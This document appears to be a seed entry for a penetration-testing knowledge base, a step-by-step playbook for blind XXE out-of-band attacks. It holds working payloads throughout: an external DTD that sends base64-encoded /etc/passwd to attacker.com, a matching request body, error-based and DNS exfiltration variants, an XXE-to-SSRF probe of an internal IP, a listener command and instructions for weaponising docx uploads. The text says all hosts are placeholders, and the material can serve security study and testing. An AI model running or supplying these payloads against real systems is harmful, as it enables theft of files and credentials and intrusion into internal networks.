# [seed] Blind XXE OOB → Exfiltrating /etc/passwd and Intranet Probing

## Scenario classification
Penetration testing / web vulnerability exploitation

## Target overview
A web interface accepts XML request bodies (SOAP / parsing uploaded docx / custom API) without echoing content ("blind XXE"). Use an external DTD + parameter entity tricks to exfiltrate target files to the attacker server.

## Complete execution chain

1. Probe points
   - Any Content-Type containing `xml` / `soap` / file uploads of docx/xlsx/pptx (containing XML) / SVG
   - After injecting a test payload, watch the response: errors / delays / OOB callbacks
2. First try a simple XXE with echo
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
3. No echo but OOB works → use an external DTD
   - Put evil.dtd on your own VPS
   - Trigger the server to load it and exfiltrate
4. OOB does not work either → check whether error-based / blind boolean works
5. After getting /etc/passwd, widen the surface:
   - Intranet port scanning (XXE → SSRF)
   - Read application configuration files (database passwords / private keys)
   - Trigger SSRF against cloud metadata → see seed-006

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| A direct SYSTEM "file://" errors | The parser disabled ENTITY references | Use nested parameter entities (%) instead | 30min |
| `<` `>` `&` in the file blow up DTD parsing | The XML specification forbids special characters inside parameter entities | Wrap in base64 with `php://filter` | 40min |
| The OOB server gets a callback on port 80 but the payload is not concatenated right | Wrong DTD nesting depth | Follow the OOB template strictly (outer + inner layer) | 1h |
| The file is read but only half of it | XML limits entity length (XML_MAX_TOKEN_BYTES) | Read in segments + offsets | 1h |
| Intranet SSRF gets connection refused everywhere | No internal services on the application's network segment | Switch to localhost / 127.0.0.1 / internal service names (K8s) | 30min |
| A Java application does not work | The default Java XML parser forbids SYSTEM | Try the `jar:` protocol / or a SOAP interface that may use an old Apache Xerces | Hours |

## Toolchain findings

- **XXEinjector** automated XXE exploitation (Ruby)
- **Burp Collaborator** / **interactsh** are essential for OOB
- **dnslog.cn / oast.online** DNS-only OOB, Chinese/international
- Upload scenarios: **a docx is zip + xml**; edit word/document.xml and zip it back up to inject
- The XXE chapter of **payloads-all-the-things** is the most complete cheatsheet

## Key code/commands

Standard two-layer OOB DTD (base64 file exfiltration inside):

**evil.dtd (placed on the attacker VPS)**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**Target request body**:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**The attacker starts an HTTP service to receive the data**:

```bash
python3 -m http.server 8000
# receives GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```

XXE → SSRF intranet scanning:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

Error echo (error-based): make the XML parser return the content in its error message:

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**docx upload XXE** (affects many document processing apps):

```bash
unzip target.docx -d unpacked/
# edit unpacked/word/document.xml and change its beginning to:
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# upload evil.docx
```

## Improvement suggestions for this package

- `pentest-tools/references/web-attack-cheatsheet.md` should have a complete XXE chapter (OOB / error / blind / docx upload / svg)
- Add interactsh-client to the bootstrap manifest (if not already there)
- routing already includes XXE, but an explicit "XXE OOB exfiltration" route is suggested

## Reusable patterns/script snippets

**XXE type decision tree**:

```text
With echo     → SYSTEM "file://" directly
Errors echoed → error-based payload (two nested layers + deliberately trigger a parse failure)
No echo at all   → standard two-layer OOB DTD (DNS / HTTP)
DNS works, HTTP does not → DNS exfil (base32-encode into subdomains)
```

**XXE protocol list (test per parser)**:

```text
file://          → read local files (most common)
http://, https:// → SSRF
ftp://           → also supported by old Java versions
gopher://        → very few PHP parsers
expect://        → command execution when PHP has the expect extension
jar://           → Java extracts files from a remote jar
netdoc://        → old Java alternative to file://
```

**DNS exfil (the weakest channel)**:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- the DNS log receives hostname.attacker.com -->
```

## Evolution actions
- [ ] Add a complete XXE chapter to web-attack-cheatsheet.md
- [ ] Check interactsh-client in the bootstrap-manifest
- [x] routing already includes an XXE entry

## Environment information
- Attacker VPS (public IP, ports 80/8000/53 open)
- Target: any web app accepting XML input (PHP/Java/Python lxml/.NET are all affected)
- OOB: interactsh / dnslog.cn / self-hosted DNS

## Redaction requirements
This entry is seed data, written from public web vulnerability exploitation patterns, with no real production target involved. All domains/IPs are placeholders.
